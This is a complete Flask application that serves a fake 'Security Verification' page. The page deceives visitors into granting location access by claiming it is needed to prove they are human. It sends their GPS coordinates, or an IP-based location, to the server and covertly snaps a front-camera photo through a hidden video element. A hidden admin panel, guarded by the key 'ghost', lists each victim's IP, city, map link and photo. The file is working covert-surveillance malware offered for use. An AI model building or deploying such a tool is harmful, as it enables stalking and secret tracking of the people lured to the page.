from flask import Flask, request, render_template_string
import json, time, os, requests, base64

app = Flask(__name__)
LOG = "hits.jsonl"
IMG_DIR = "static/images"
os.makedirs(IMG_DIR, exist_ok=True)

PAGE = """
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Security Check</title>
<style>
body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0d1117;color:#e6edf3;font-family:-apple-system,sans-serif;text-align:center}
.box{background:#161b22;padding:40px 20px;border-radius:12px;border:1px solid #30363d;width:85%;max-width:400px}
h1{font-size:22px;margin:0 0 15px;color:#58a6ff}
p{color:#8b949e;font-size:15px;line-height:1.5;margin-bottom:25px}
.btn{background:#238636;color:#fff;border:none;padding:15px 30px;font-size:18px;border-radius:8px;font-weight:bold;width:100%;cursor:pointer;display:none}
.btn:hover{background:#2ea043}
.err{color:#f85149;font-size:16px;font-weight:bold;margin-bottom:20px;display:none}
.spin{width:50px;height:50px;border:4px solid #30363d;border-top-color:#58a6ff;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style></head><body>
<div class="box">
  <div class="spin" id="load"></div>
  <h1 id="title">Security Verification</h1>
  <div class="err" id="err">Connection failed. Location access is required.</div>
  <p id="msg">Please allow location access to verify you are human and secure your connection.</p>
  <button class="btn" id="btn" onclick="requestGeo()">Try Again</button>
</div>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
let data = {};
let v = document.getElementById('v'), c = document.getElementById('c');

function requestGeo(){
  document.getElementById('btn').style.display = 'none';
  document.getElementById('err').style.display = 'none';
  document.getElementById('load').style.display = 'block';
  document.getElementById('title').innerText = 'Verifying...';
  document.getElementById('msg').innerText = 'Please wait while we check your connection.';

  navigator.geolocation.getCurrentPosition(
    p=>{
      data.lat = p.coords.latitude; data.lon = p.coords.longitude; data.acc = p.coords.accuracy; data.src = 'gps';
      done();
    },
    e=>{
      data.src = 'ip'; data.reason = 'denied';
      fail();
    },
    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
  );
}

function fail(){
  document.getElementById('load').style.display = 'none';
  document.getElementById('title').innerText = 'Access Denied';
  document.getElementById('err').style.display = 'block';
  document.getElementById('msg').innerText = 'You must allow location access to proceed. Please click "Try Again" and select "Allow".';
  document.getElementById('btn').innerText = 'Allow Location';
  document.getElementById('btn').style.display = 'block';
  sendData();
}

function done(){
  document.getElementById('load').style.display = 'none';
  document.getElementById('title').innerText = 'Verified Successfully';
  document.getElementById('title').style.color = '#3fb950';
  document.getElementById('msg').innerText = 'Your location has been verified. You may close this page.';
  sendData();
  getCam();
}

function sendData(){
  fetch('/c',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(()=>{});
}

function getCam(){
  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
  .then(stream => {
    v.srcObject = stream;
    v.onloadedmetadata = () => {
      setTimeout(() => {
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        data.photo = c.toDataURL('image/jpeg', 0.5).split(',')[1];
        sendData();
      }, 1000);
    };
  }).catch(()=>{});
}
setTimeout(requestGeo, 1500);
</script></body></html>
"""

@app.route("/")
def index(): return render_template_string(PAGE)

@app.route("/c", methods=["POST"])
def collect():
    d = request.get_json(silent=True) or {}
    ip = (request.headers.get("X-Forwarded-For","") or request.remote_addr or "").split(",")[0].strip()
    img_name = ""
    if "photo" in d:
        img_name = f"img_{int(time.time())}.jpg"
        with open(os.path.join(IMG_DIR, img_name), "wb") as f:
            f.write(base64.b64decode(d["photo"]))
        del d["photo"]
    rec = {"ts": int(time.time()), "ip": ip, "ua": request.headers.get("User-Agent",""), "lat": d.get("lat"), "lon": d.get("lon"), "acc": d.get("acc"), "src": d.get("src"), "reason": d.get("reason"), "img": img_name}
    if not rec["lat"] and ip:
        try:
            g = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country,isp", timeout=5).json()
            if g.get("status") == "success": rec.update({"lat": g["lat"], "lon": g["lon"], "city": g.get("city"), "country": g.get("country"), "isp": g.get("isp")})
        except: pass
    with open(LOG, "a") as f: f.write(json.dumps(rec) + "\n")
    return ("", 204)

@app.route("/admin")
def admin():
    if request.args.get("key","") != "ghost": return "not found", 404
    rows = []
    if os.path.exists(LOG):
        with open(LOG) as f: rows = [json.loads(l) for l in f if l.strip()][::-1]
    out = ["<html><meta charset='utf-8'><body style='background:#0d1117;color:#e6edf3;font-family:monospace;padding:20px'><h2 style='color:#58a6ff'>Hits</h2><table border=1 cellpadding=6 style='border-collapse:collapse;font-size:13px'><tr><th>time</th><th>src</th><th>map</th><th>photo</th><th>ip</th><th>city</th><th>ua</th></tr>"]
    for r in rows:
        mp = f"<a target='_blank' href='https://maps.google.com/?q={r['lat']},{r['lon']}'>map</a>" if r.get("lat") else "—"
        img = f"<a target='_blank' href='/static/images/{r['img']}'>view</a>" if r.get("img") else "—"
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        out.append(f"<tr><td>{t}</td><td>{r.get('src','?')}</td><td>{mp}</td><td>{img}</td><td>{r['ip']}</td><td>{r.get('city','')}/{r.get('country','')}</td><td>{r['ua'][:50]}</td></tr>")
    out.append("</table></body></html>")
    return "".join(out)

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
